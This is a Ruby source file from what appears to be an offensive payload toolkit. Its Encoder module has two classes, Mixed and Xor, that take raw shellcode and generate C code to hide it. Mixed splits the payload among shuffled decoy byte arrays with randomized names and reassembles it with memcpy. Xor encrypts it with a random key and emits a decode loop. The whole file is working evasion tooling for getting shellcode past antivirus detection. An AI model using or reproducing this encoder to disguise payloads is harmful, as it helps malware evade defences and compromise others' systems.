#!/usr/bin/env ruby
# -*- coding: binary -*-
# Code by Green-m
# Test  on ruby 2.3.3
$LOAD_PATH.unshift(File.dirname(__FILE__))
require 'output'
require 'utils'

module Encoder 

class Mixed
    def initialize(raw_code)
        @raw_code = raw_code
        @encoded_code = ""
        @decoded_code = ""
        @shellcode_name = ""
    end


    def generate
        raw_code = @raw_code

        raw_code = Encoder::cshellcode_pretreat(raw_code)
        shellcode_array =  random_split_str(raw_code,3)

        fake_shellcode_array = random_split_str(Encoder::hex_to_rubyshellcode(SecureRandom.hex(rand(200..300))),3)

        function_hash = {}
        function_hash["shellcode1"] = random_funcname()
        function_hash["shellcode2"] = random_funcname()
        function_hash["shellcode3"] = random_funcname()
        function_hash["fake_code1"] = random_funcname()
        function_hash["fake_code2"] = random_funcname()
        function_hash["fake_code3"] = random_funcname()
        function_hash["total_code"] = random_funcname()
        @shellcode_name = function_hash["total_code"]

        code_hash = {}
        code_hash["shellcode1"] = Encoder::c_shellcode_format(shellcode_array[0])
        code_hash["shellcode2"] = Encoder::c_shellcode_format(shellcode_array[1])
        code_hash["shellcode3"] = Encoder::c_shellcode_format(shellcode_array[2])
        code_hash["fake_code1"] = Encoder::ruby_to_c_shellcode(fake_shellcode_array[0])
        code_hash["fake_code2"] = Encoder::ruby_to_c_shellcode(fake_shellcode_array[1])
        code_hash["fake_code3"] = Encoder::ruby_to_c_shellcode(fake_shellcode_array[2])

        code_hash = Hash[code_hash.to_a.shuffle]

        # encoded code
        @encoded_code = ""
        code_hash.each_pair do |k,v|
            @encoded_code << %Q{unsigned char #{function_hash[k]}[] = \n}
            @encoded_code << "#{v} \n"
        end

        buf_malloc_size = rand(@raw_code.length+100..@raw_code.length+200)
        @encoded_code << %Q{unsigned char #{function_hash["total_code"]}[#{buf_malloc_size}] = "" ; \n}

        # decode code 

        @decoded_code =   %Q{memcpy(#{function_hash["total_code"]},#{function_hash["shellcode1"]},sizeof(#{function_hash["shellcode1"]})); \n}
        @decoded_code <<  %Q{memcpy(#{function_hash["total_code"]}+sizeof(#{function_hash["shellcode1"]})-1,#{function_hash["shellcode2"]},sizeof(#{function_hash["shellcode2"]})); \n}
        @decoded_code <<  %Q{memcpy(#{function_hash["total_code"]}+sizeof(#{function_hash["shellcode1"]})+sizeof(#{function_hash["shellcode2"]})-2,#{function_hash["shellcode3"]},sizeof(#{function_hash["shellcode3"]})); \n}

        return @encoded_code,@decoded_code,@shellcode_name

    end

end


class Xor
    def initialize(raw_code)
        @raw_code = raw_code
        @encoded_code = ""
        @decoded_code = ""
        @shellcode_name = ""
    end


    def generate
        raw_code = @raw_code
        raw_code_array = Encoder::cshellcode_pretreat(raw_code)
        @shellcode_name = random_funcname()
        xor_key_name = random_funcname()

        
        # generate xor keys 
        rand_xor_key_cformat = ""
        rand_xor_key_array = random_hex(5..15).scan(/.{1,2}/)
        rand_xor_key_array.each{|x|rand_xor_key_cformat << "\\x"+x}

        # do xor with ruby 
        xored_code_array = ""
        for i in 0...raw_code_array.length
            tmp = (raw_code_array[i][2..3].hex ^ rand_xor_key_array[i % rand_xor_key_array.length][0..1].hex).to_s(16)
            tmp = "0" + tmp if tmp.length == 1
            xored_code_array << "\\x" + tmp
        end

        xored_code_str = Encoder::c_shellcode_format(xored_code_array)

        # encoded code 
        @encoded_code = %Q{unsigned char #{@shellcode_name}[] = \n}
        @encoded_code << xored_code_str
        @encoded_code << "\n" + %Q{unsigned char #{xor_key_name}[] = "#{rand_xor_key_cformat}"; \n}
 
        # decoded code
        @decoded_code = %Q{for (int i=0; i<(sizeof(#{@shellcode_name})-1) ; i++)\n}
        @decoded_code << %Q{{#{@shellcode_name}[i] = #{@shellcode_name}[i] ^ #{xor_key_name}[i % (sizeof(#{xor_key_name}) - 1)];} \n}

        return @encoded_code,@decoded_code,@shellcode_name

    end

end








end
